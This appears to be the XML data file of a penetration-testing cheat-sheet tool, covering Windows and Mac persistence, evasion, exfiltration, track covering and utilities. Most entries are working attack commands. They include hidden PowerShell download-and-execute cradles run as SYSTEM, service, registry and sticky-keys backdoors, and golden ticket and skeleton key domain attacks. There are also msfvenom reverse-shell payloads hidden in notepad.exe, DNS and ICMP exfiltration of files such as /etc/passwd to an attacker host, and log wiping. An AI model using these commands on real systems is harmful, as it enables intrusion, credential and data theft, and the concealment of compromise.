    "[powershell directory] -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://[ip]:[port]/[payload]'''))'" /SC [option]

Powershell directory:
[x86]   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
[x64]   C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

Options:
    On Login:           onlogon /RU System
    On Start:           onstart /RU System
    On Idle (30 min):   onidle /i 30</info>
        </option>
        <option name="Scheduled Payload">
            <info>Schedule a payload to automatically execute every X minutes.
                
Usage (every 5 minutes):
    SCHTASKS /Create /RU SYSTEM /SC MINUTE /MO 5 /TN [visible name] /TR "%USERPROFILE%\[path to executable]" /ED [DD/MM/YYYY expiration]
    
Example:
SCHTASKS /Create /RU SYSTEM /SC MINUTE /MO 5 /TN megapwn /TR "\"C:\\USERS\\mike.MEGACORPONE\\Downloads\\evil.exe\""</info>
        </option>
        <option name="SMB Shared Payload">
            <info>Share a backdoor executable on a public file share for later execution.
            
1) Share folder
    C:\&gt; net share [share] c:\[share] /GRANT:Everyone,Full

2) Execute shared file remotely
    C:\&gt; net time \\[share]
    C:\&gt; at \\[share] [HH:MM] [file] [args]</info>
        </option>
        <option name="Create Service">
            <info>Create a service to run our executable on boot.
                
Usage:
    meterpreter &gt; run sc -n [service name] -p [service exe path on target]
(or)
    C:\&gt; sc create [service name] binpath= [service exe path on target]
    
Run Service:
    C:\&gt; sc start [service name]</info>
        </option>
        <option name="Create Service - Remote (Domain)">
            <info>Create service on a remote system to run our executable on boot.
                
Usage:
    C:\&gt; sc \\[server] create usvc binpath= [service exe path on target]
    
Run Service:
    C:\&gt; sc \\[server] start [service name]</info>
        </option>
        <option name="Registry Script">
            <info>Drop a script into the registry.
                
1) Build the script
    veil-evasion
    &gt; use powershell/shellcode_inject/download_virtual
    &gt; set DOWNLOAD_HOST [payload server]
    &gt; generate
    &gt; 1 (msfvenom)
    &gt; windows/(x64/)meterpreter/reverse_https
    &gt; [return ip]
    &gt; [return port]
    
    * creates Payload File (.txt) containing script
    * creates Handler File
    
(or use script directly)
    powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c 'iex (New-Object Net.WebClient).DownloadString(\"http://[hosting server]/[hosted handler name]\")'

2) Host Handler
    cp ~/veil-output/source/[handler file] /var/www/html
    service apache2 start
    
3) Install Payload
    meterpreter &gt; reg createkey -k "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe"
    meterpreter &gt; reg setval -k "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe" -t REG_SZ -v Debugger -d "[script from Payload File]"</info>
        </option>
        <option name="Golden Ticket (Domain)">
            <info>Build and use a golden ticket to become a domain administrator.
                
Gather:
    Domain (CORP):
        C:\&gt; whoami
            corp\jim.stevens
            
    Domain Admin User (Administrator):
        C:\&gt; net localgroup administrators /DOMAIN
            MEMBERS
            ---------------------
            Administrator
            
    Domain SID (S-1-5-21-3897896083-1904415509-3232507668):
        C:\&gt; whoami /user
            USER NAME           SID
            ==========          ==============================================
            corp\jim.stevens    S-1-5-21-3897896083-1904415509-3232507668-1112
            
    Krbtgt hash from DC (6054781dbca15ebf90c9618055d16f34):
        (on DC, as System, migrated into process that started as system - not getSystem)
        meterpreter &gt; hashdump
            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6054781dbca15ebf90c9618055d16f34
        
Build:
    meterpreter &gt; use kiwi
    meterpreter &gt; golden_ticket_create -u Administrator -d CORP -k 6054781dbca15ebf90c9618055d16f34 -s S-1-5-21-3897896083-1904415509-3232507668 -t [output].tkt
(or)
    msf &gt; use post/windows/escalate/golden_ticket
        
Use (on any standard domain user):
    meterpreter &gt; use kiwi
    meterpreter &gt; kerberos_ticket_use [golden ticket path]
    meterpreter &gt; shell
    &gt; dir \\[server]\\C$</info>
        </option>
        <option name="Skeleton Key (Domain)">
            <info>Apply a secret login for a Domain Administrative account.
                
Setup (in Domain Administrative account - lab@hacker.testlab):
    (copy over mimikatz.exe)
    C:\&gt; mimikatz
    mimikatz # privilege::debug
    mimikatz # misc::skeleton
    mimikatz # exit
    
Usage (in other account):
    net use * \\DC\C$ /user:[domain]\[domain admin] mimikatz</info>
        </option>
        <option name="Sticky Keys">
            <info>Setup the registry such that hitting shift 5 times will bring up a shell.
                
Allow RDP:
    netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
    REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Setup:
    REG ADD "HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp" /v UserAuthentication /t REG-DWORD /d 0
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0</info>
        </option>
    </area>
    <area name="Persistence - Mac">
        <option name="Add User">
            <info>Add a user on a Mac system.
                
Usage:
    sudo dscl . create /Users/[user]
    sudo dscl . create /Users/[user] UserShell /bin/bash
    sudo dscl . create /Users/[user] RealName "[name]"
    sudo dscl . create /Users/[user] UniqueID [ID - e.g. 503]
    sudo dscl . create /Users/[user] PrimaryGroupID 1000
    sudo dscl . create /Users/[user] NFSHomeDirectory /Local/Users/[user]
    sudo dscl . passwd /Users/[user] [password]
    sudo dscl . append /Groups/admin GroupMembership [user]

(add to sudoers)
    sudo visudo
    &gt; [user] ALL=(ALL) ALL</info>
        </option>
    </area>
    <area name="Misc">
        <option name="Compile C program">
            <info>Compile a C program / exploit.

Designed for Linux:
    gcc [input].c -o [output]

Designed for Windows:
    i686-w64-mingw32-gcc [intput].c (-lws2_32) -o [output].exe</info>
        </option>
        <option name="Create Windows Executable from Python Script">
            <info>Create a standalone Windows executable from a Python script.
                
Usage:
    wine "C:\\Python27\\python.exe" /usr/share/pyinstaller/pyinstaller.py [script].py
(or)
    C:&gt; python pyinstaller --onefile [script].py
    
    * creates build/[script].exe</info>
        </option>
        <option name="SSL Key and Certificate">
            <info>Produce a self-signed SSL key and certificate
            
Usage:
    openssl genrsa -out ca.key 4096
    openssl req -new -x509 -days 1826 -key ca.key -out ca.cer</info>
            
        </option>
        <option name="RSA Key Pair (SSH)">
            <info>Produce an RSA key pair for use with SSH.

Usage:
    ssh-keygen -t rsa
    
Configure SSH:
    Place the newly created public key in '~/.ssh/' on the remote SSH server.</info>
            
        </option>
        <option name="HTTP Server">
            <info>Set up a simple HTTP Server.

Usage:
  python -m SimpleHTTPServer [port]</info>
        </option>
        <option name="SMTP Server">
            <info>Set up a simple SMTP Server.
            
Usage:
    dpkg-reconfigure exim4-config
    
Configuration:
    General type of mail configuration: internet site
    System mail name: [your domain]
    IP-addresses to listen on for incoming SMTP connections : // leave blank
    Other destinations for which mail is accepted: [your domain]
    Domains to relay mail for: // leave blank
    Machines to relay mail for: // leave blank
    Keep number of DNS-queries minimal (Dial-on-Demand) ?: No
    Delivery method for local mail: Maildir format in home directory
    Split configuration into small files ? : No
    
* this writes configuration to /etc/exim4/update-exim4.conf.conf</info>
            
        </option>
        <option name="FTP Server">
            <info>Set up a simple FTP server.
                
Download and Install:
    apt-get install pure-ftpd
    
Add User:
    groupadd ftpgroup
    useradd -g ftpgroup -d /dev/null -s /etc ftpuser
    pure-pw useradd [user] -u ftpuser -d /ftphome
    pure-pw mkdb
    cd /etc/pure-ftpd/auth/
    ln -s ../conf/PureDB 60pdb
    mkdir -p /ftphome
    chown -R ftpuser:ftpgroup /ftphome/
    
Start FTP Server
    /etc/init.d/pure-ftpd restart
    
Interact (Windows, non-interactive):
    C:\&gt; echo open [host ip] 21 &gt; ftp.txt
    C:\&gt; echo [user] &gt;&gt; ftp.txt
    C:\&gt; echo [password] &gt;&gt; ftp.txt
    C:\&gt; echo bin &gt;&gt; ftp.txt
    C:\&gt; echo GET [file] &gt;&gt; ftp.txt
    C:\&gt; bye &gt;&gt; ftp.txt
    ftp -s:ftp.txt</info>
        </option>
        <option name="TFTP Server">
            <info>Set up a simple TFTP server.
            
Setup:
    mkdir /tftp
    cp [file] /tftp/
    atftpd --daemon --port 69 /tftp
    
Interact (Windows, non-interactive):
    C:\&gt; tftp -i [host ip] GET [file]</info>
        </option>
        <option name="Windows Wget Clone - VBS">
            <info>Create a wget clone on a Windows machine using VBS.

Creation:
    C:\&gt; echo strUrl = WScript.Arguments.Item(0) > wget.vbs
    C:\&gt; echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
    C:\&gt; echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
    C:\&gt; echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
    C:\&gt; echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
    C:\&gt; echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
    C:\&gt; echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
    C:\&gt; echo Err.Clear >> wget.vbs
    C:\&gt; echo Set http = Nothing >> wget.vbs
    C:\&gt; echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
    C:\&gt; echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
    C:\&gt; echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
    C:\&gt; echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
    C:\&gt; echo http.Open "GET", strURL, False >> wget.vbs
    C:\&gt; echo http.Send >> wget.vbs
    C:\&gt; echo varByteArray = http.ResponseBody >> wget.vbs
    C:\&gt; echo Set http = Nothing >> wget.vbs
    C:\&gt; echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
    C:\&gt; echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
    C:\&gt; echo strData = "" >> wget.vbs
    C:\&gt; echo strBuffer = "" >> wget.vbs
    C:\&gt; echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
    C:\&gt; echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
    C:\&gt; echo Next >> wget.vbs
    C:\&gt; echo ts.Close >> wget.vbs

Usage:
    C:\&gt; cscript wget.vbs http://[server]/[file] [output]</info>
        </option>
        <option name="Windows Wget Clone - Powershell">
            <info>Create a wget clone on a Windows machine using powershell.
                
Creation:
    C:\&gt; echo $storageDir = $pwd > wget.ps1
    C:\&gt; echo $webclient = New-Object System.Net.WebClient >>wget.ps1
    C:\&gt; echo $url = "http://[host]/[file]" >>wget.ps1
    C:\&gt; echo $file = "new-exploit.exe" >>wget.ps1
    C:\&gt; echo $webclient.DownloadFile($url,$file) >>wget.ps1

Usage:
      C:\&gt; powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1</info>
        </option>
    </area>
</type>
<type name="Defend">
    <area name="Spoofing">
        <option name="Spoof MAC Address">
            <info>Spoof your MAC address.
            
Usage:
    macchanger [options] [interface]

Options:
    -r                  use completely random MAC address
    -m  [mac address]   use specific MAC addresss
    -p                  reset to permanent hardward MAC address
            </info>
        </option>
        <option name="Spoof Browser - User-Agents">
            <info>Supply an official user-agent with web traffic to spoof a different browser.
            
Local User Agent Lists:
    for line in $(locate user-agents.txt)
        do wc -l $line
    done</info>
        </option>
    </area>
    <area name="Anonymizing">
        <option name="Use a Proxy">
            <info>Prepend any command with proxychains to execute that command via the pre-defined proxy configuration.
                
Configuration (/etc/proxychains.conf):
    1. Select chaining option
        Dynamic - use proxy list in listed order, dead hosts are skipped
        Strict - use proxy list in listed order, dead host will cancel entire sequence
        Random - use proxy list in random order (best against IDS)
    2. Add proxies to list (default - TOR)

Usage:
    proxychains [the command you want proxied] [any arguments]
    
Note: TOR not installed by default.  To check if TOR is installed and running:
    which tor &amp;&amp; netstat -antp | grep tor</info>
            
        </option>
        <option name="Use a Proxy (single serving terminal)">
            <info>Configure a single terminal to use a proxy.
                
Usage:
    export http_proxy='http://[ip]:[port]'</info>
            
        </option>
        <option name="Download TOR">
            <info>Download and install The Onion Router (TOR) to anonymize your web traffic.
                
Usage:
    apt-get install tor
    
Check if running:
    netstat -antp | grep tor
    
Configure proxychains (/etc/proxychains.conf):
    socks4 127.0.0.1 9050
    
Configure browser:
    - Manual Proxy Settings
    -&gt; SOCKS Host (SOCKSv5)
        127.0.0.1 9050</info>
            
        </option>
    </area>
    <area name="Evading">
        <option name="Packet Fragmentation">
            <info>Manipulate the structure of packets passing between the attacking and target machines in an attempt to evade firewalls and avoid IDS/IPS detection.
                
Usage:
    fragroute -f [config file] [target]
    
Default Configuration (/etc/fragroute.conf):
    tcp_seg -&gt; ip_frag -&gt; ip_chaff -&gt; order -&gt; print</info>
        </option>
        <option name="MITM Packet Fragmentation">
            <info>Poison the ARP cache of the default gateway and the target to route their traffic through you, then fragment the packets.
                    
Usage:
    arpspoof -i [interface] -t [target] -r [default gateway]
    fragrouter -i [interface] [filter]
                    
Identify available filters with:
    fragrouter -h</info>
            
        </option>
        <option name="Check for Honeypot">
            <info>Check for common signs of a local honeypot (based on 2015 data).

Credit to DeanSysman, Gadi Evron, Itamar Sher
Breaking Honeypots for Fun and Profit

-----------------------
Beartrap
-----------------------

Default Banner:
    ftp [target]
        -&gt; Response: 220 BearTrap-ftpd Service Ready
        
FTP always returns 530


-----------------------
Honeyd
-----------------------

FTP doesn't support DELE command

SSH open, but doesn't do anything
    

-----------------------
Nova
-----------------------

NetBIOS open, but doesn't do anything


-----------------------
Kippo
-----------------------

Check SSH protocol implementation
    service ssh start
    printf "\n\n\n\n\n\n\n\n" | nc -n -w3 127.0.0.1 22
        * note response
    printf "\n\n\n\n\n\n\n\n" | nc -n -w3 [target] 22
        * compare response
        
Metasploit - check Kippo SSH Honeypot
    msfconsole -r &lt;(echo '
        use auxiliary/scanner/ssh/detect_kippo
        set RHOSTS [target]
        set RPORT 22
        exploit
    ')
    
By default, "uname -a" always returns:
    Linux [honeypot hostname] 2.6.26-2-686 #1 SMP Wed Nov 4 20:45:37 UTC 2009 i686 GNU/Linux
 
 
-----------------------
Dionaea
-----------------------

HTTPS certificate self signed:
    dionaea.carnivore.it
    
FTP allows login with any input as well as 2 passwords for the same user

FTP doesn't support DELE command:
    "502 Command 'DELE' not implemented"
  
  
-----------------------
Glastopf (web app)
-----------------------

Access to ../../../etc/shadow
    +
Access to /proc

Check /proc/&lt;pid&gt;/smaps to see if traffic matches what you create


-----------------------
KFSensor
-----------------------

HTTPS open, but doesn't do anything</info>
            
        </option>
        <option name="Auto-Check for Protection Mechanisms (Linux)">
            <info>Check to see what installed applications could be used to prevent or detect attacks.

Linux:
    msf &gt; use post/linux/gather/enum_protections</info>
        </option>
        <option name="Obfuscate Payload - Alternate Template">
            <info>Obfuscate a metasploit payload by using an alternate template.

Example (embed payload into notepad.exe):
    msfvenom -a x64 --platform windows -x notepad.exe -p windows/x64/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe</info>
        </option>
        <option name="Obfuscate Payload - Backdoor">
            <info>Backdoor a payload into an existing executable.
                
Usage:
    backdoor-factory -f [executable] -s show
(for reverse shell)
    backdoor-factory -f [executable] -s [payload] -H [return ip] -P [return port]</info>
        </option>
        <option name="Obfuscate Payload - Encoding">
            <info>Obfuscate a metasploit payload by using encoding.
                
List of encodings:
    for i in $(ls /usr/share/metasploit-framework/modules/encoders);do echo "___$i" &amp;&amp; ls -lAh /usr/share/metasploit-framework/modules/encoders/$i;done
    
Example:
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_uuid LHOST=[return ip] LPORT=[return port] -f exe -o [output].exe -e x86/shikata_ga_nai</info>
        </option>
        <option name="Obfuscate Payload - Veil">
            <info>Obfuscate a metasploit payload using Veil Evasion.
                
Usage:
    veil-evasion
    &gt; list
    &gt; use [payload index]
    &gt; options
    &gt; (set options)
    &gt; generate</info>
        </option>
        <option name="Data Exfiltration over DNS">
            <info>Transfer data from the target in DNS Lookup packets.
            
Linux Victim:
    (hex encode file)
        xxd [file] encodedFile.hex
    (read each line and do DNS lookup)
        for b in `cat encodedFile.hex`; do dig [attacker dns server]; done
    
Attacker
    tcpdump -w [output] -s0 port 53 and host [attacker dns server]
    tcpdump -r [output] -n | grep [attacker dns server] | cut -f9 -d' ' | cut -f1 -d'.' | uniq > [encoded output].txt
    xxd -r -p &lt; [encoded output].txt *gt; [decoded output].txt</info>
        </option>
        <option name="Data Exfiltration over ICMP">
            <info>Transfer data from the target in ICMP packets.

(*tested with /etc/passwd)

Linux Victim:
    stringZ=`cat [file*] | od -tx1 | cut -c8- | tr -d " " | tr -d "\n"`;counter=0;while (($counter &lt;= ${#stringZ}));do ping -s 16 -c 1 -p ${stringZ:$counter:16} 10.0.1.16 &amp;&amp; counter=$((counter+16));done;

Attacker:
    tcpdump -ntvvSxs 0 'icmp[0]=8' &gt; data.dmp
    grep 0x0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p</info>
        </option>
    </area>
    <area name="Covering Tracks">
        <option name="TODO: Clear Logs">
            <info>Clear logs.
            
Linux:
    echo "" > /var/log/auth.log
    
Windows:

Mac:
            </info>
        </option>
        <option name="TODO: Clear History">
            <info>Clear command history.
            
Linux:
    echo "" > ~/.bash_history
    history -c
    
Windows:


Mac:
    echo "" > ~/.bash_history
    history -c
            </info>
        </option>
        <option name="TODO: View/Change Date of File Edits">
            <info>Change file timestamps.
            
Linux:
    touch -t YYYYMMDDHHSS [file]
(or)
    touch -r [reference file] [file]
    
Windows:


Mac:
            </info>
        </option>
    </area>
</type>
<type name="Utility">
    <area name="Scripting">
        <option name="Bash">
            <info>Basics of scripting in Bash.
        
For Loop:
    for i in {1..10};do [command];done;
(or)
    for i in $(seq 100 110); do [command];done;

For Each Loop:
    for var in $([command]);do [command];done;
    
Execute command in background
    [command] &amp;
    
Parse output:
    cat output.txt | grep [keyword] | cut -d "[delimiter]" -f [section to print]
    
Search for keyword in files:
    cd [directory containing files]
    grep -rl [keyword] *</info>
        </option>
        <option name="Windows">
            <info>Basics of scripting on Windows.
            
For loop:
    for /L %i in (1,1,10) do @ ([command])
    
For Each loop:
    for /F %i in ([file]) do [command]
    
Forceably delete all files in [path]:
    del [path]\*.* /a /s /q /f
    
Find "str" in file
    find /I "str" [filename]
    
Line count of [cmd] output:
    [command] | find /c /v ""
            </info>
            
        </option>
        <option name="Python">
            <info>Basics of scripting in Python.</info>
            
        </option>
        <option name="Metasploit">
            <info>Basics of scripting for Metasploit Modules.</info>
            
        </option>
    </area>
    <area name="Misc">
        <option name="Open image from terminal">
            <info>Open an image from the terminal.
                
Usage:
    xdg-open [image]</info>
            
        </option>
        <option name="Zip a file">
            <info>Zip a file.

Usage:
    zip [output] [input]</info>
        </option>
        <option name="Extract a compressed file">
            <info>Extract a compressed file.
                
Usage (.gz):
    gunzip -k [file]
(or)
    gzip -d [file]
    
Usage (tar.gz or .tgz):
    tar xvzf [file]</info>
            
        </option>
        <option name="Sort list">
            <info>Sort the information in a list.
                
Usage:
    sort [file]</info>
            
        </option>
        <option name="Compare two lists">
            <info>Compare the contents of two lists.
                
Usage:
    diff &lt;(sort [file 1]) &lt;(sort [file 2])</info>
            
        </option>
        <option name="Remove duplicates">
            <info>Print the contents of a file, leaving out duplicates.
                
Usage:
    awk '!x[$0]++' [file]
or
    cat [file] | awk '!x[$0]++'</info>
            
        </option>
        <option name="Change Appearance">
            <info>Change the appearance of the desktop to look less suspicious.
                
Download Wallpaper:
    Windows 7 - wget http://www.sevenforums.com/attachments/tutorials/173429d1314981906-desktop-background-change-img0.jpg -O /tmp/windows7.jpg
    Windows 10 - wget http://www.windows10update.com/wp-content/uploads/2015/06/microsoft-reveals-the-official-windows-10-wallpaper-485311-4.jpg -O /tmp/windows10.jpg
    
Set Wallpaper:
    gsettings set org.gnome.desktop.background picture-uri [image]
    
Transform Dock:
    gsettings set org.gnome.shell.extensions.dash-to-dock extend-height true;
    gsettings set org.gnome.shell.extensions.dash-to-dock dock-position 'BOTTOM';
    gsettings set org.gnome.shell.extensions.dash-to-dock dock-fixed true;</info>
        </option>
        <option name="Flash Terminal When Complete">
            <info>Flash the terminal when a process is complete.
                
Usage:
    [process]; setterm --inversescreen on; read -p "Finished! Press [enter] to continue...";setterm --inversescreen off;</info>
        </option>
        
        <option name="Screenshot Window">
            <info>Capture a screenshot of the selected window.
                
Usage:
    import [output].png
    { Click on Window }</info>
        </option>
        <option name="Write to clipboard">
            <info>Write data to the clipboard.

Usage:
    cat [file] | xclip</info>
        </option>
        <option name="Base64 decode">
            <info>Decode a base64 encoded string.
            
Usage:
    echo "[string]" | base64 -d</info>
        </option>
        <option name="Hex decode">
            <info>Decode a hex encoded string.
            
Usage:
    echo "[string]" | xxd -r -p</info>
        </option>
    </area>
    <area name="Unsorted">
        <option name="Convert LM hash to NTLM hash">
            <info>To convert an LM hash to an NTLM hash, just prepend with a blank LM hash.  Full NTLM hash required by some programs (e.g. metasploit smb_login), whereas some hash dumps (e.g. mimikatz) only dump LM hashes.
                
Usage:
    aad3b435b51404eeaad3b435b51404ee:[NT hash]</info>
            
        </option>
        <option name="Metasploit - Meterpreter Upgrade">
            <info>Upgrade a simple command shell to a meterpreter shell.
                
Usage:
    msf &gt; use post/multi/manage/shell_to_meterpreter
    msf &gt; set LHOST [return ip]
    msf &gt; set LPORT [new return port]
    msf &gt; set SESSION [session ID]</info>
            
        </option>
        <option name="Interactive shell upgrade - Python">
            <info>Upgrade a non-interactive shell to an interactive one with a python command.
                
Usage:
    python -c 'import pty; pty.spawn("/bin/bash")'
    [ctrl-z to background, note id]
    stty raw -echo
    (if needed) export TERM=[screen]
    fg [id]</info>
        </option>
        <option name="Copy file through ssh">
            <info>Copy a file through ssh to another host.
                
Usage:
    scp [local file] [user]@[remote host]:[directory on remote host]</info>
        </option>
    </area>
</type>
</types>
